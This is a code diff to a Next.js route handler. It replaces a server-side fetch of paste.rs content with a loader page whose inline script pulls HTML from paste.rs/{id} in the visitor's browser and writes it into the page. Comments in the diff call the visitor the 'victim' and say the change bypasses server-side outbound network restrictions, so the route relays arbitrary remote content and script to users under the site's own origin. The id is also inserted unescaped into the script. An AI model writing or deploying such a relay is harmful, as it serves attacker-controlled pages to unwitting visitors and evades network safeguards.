@@ -8,39 +8,50 @@ export async function GET(req: NextRequest, { params }: { params: { id: string }
         return new NextResponse('Missing page ID.', { status: 400 });
     }
 
-    try {
-        // Fetch the raw content from the paste service
-        const rawContentUrl = `https://paste.rs/${id}`;
-        const fetchResponse = await fetch(rawContentUrl, {
-             headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-            },
-            next: { revalidate: 0 } // Do not cache the fetch response
-        });
+    // Client-side fetcher script
+    // This script runs in the victim's browser, fetching the content directly
+    // and bypassing server-side outbound network restrictions.
+    const clientSideScript = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Loading...</title>
+            <style>
+                body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f0f0; }
+                .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+            </style>
+        </head>
+        <body>
+            <div class="loader"></div>
+            <script>
+                (async () => {
+                    try {
+                        const response = await fetch('https://paste.rs/${id}');
+                        if (!response.ok) {
+                            throw new Error('Failed to load page content.');
+                        }
+                        const htmlContent = await response.text();
+                        document.open();
+                        document.write(htmlContent);
+                        document.close();
+                    } catch (error) {
+                        console.error('Failed to fetch and render content:', error);
+                        document.body.innerHTML = '<h1>Error</h1><p>Unable to load the requested page.</p>';
+                    }
+                })();
+            </script>
+        </body>
+        </html>
+    `;
 
-        if (!fetchResponse.ok) {
-            return new NextResponse(`Failed to fetch content from upstream service. Status: ${fetchResponse.status}`, { status: 502 });
-        }
-        
-        const htmlContent = await fetchResponse.text();
-        
-        if (!htmlContent) {
-            return new NextResponse('Content not found.', { status: 404 });
-        }
-
-        // Return the content with the correct HTML MIME type
-        return new NextResponse(htmlContent, {
-            status: 200,
-            headers: { 
-                'Content-Type': 'text/html; charset=utf-8',
-                'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
-                'Pragma': 'no-cache',
-                'Expires': '0',
-            },
-        });
-
-    } catch (error) {
-        console.error(`Error serving page for ID ${id}:`, error);
-        return new NextResponse('An internal error occurred while trying to serve the page.', { status: 500 });
-    }
+    return new NextResponse(clientSideScript, {
+        status: 200,
+        headers: { 
+            'Content-Type': 'text/html; charset=utf-8',
+            'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
+            'Pragma': 'no-cache',
+            'Expires': '0',
+        },
+    });
 }
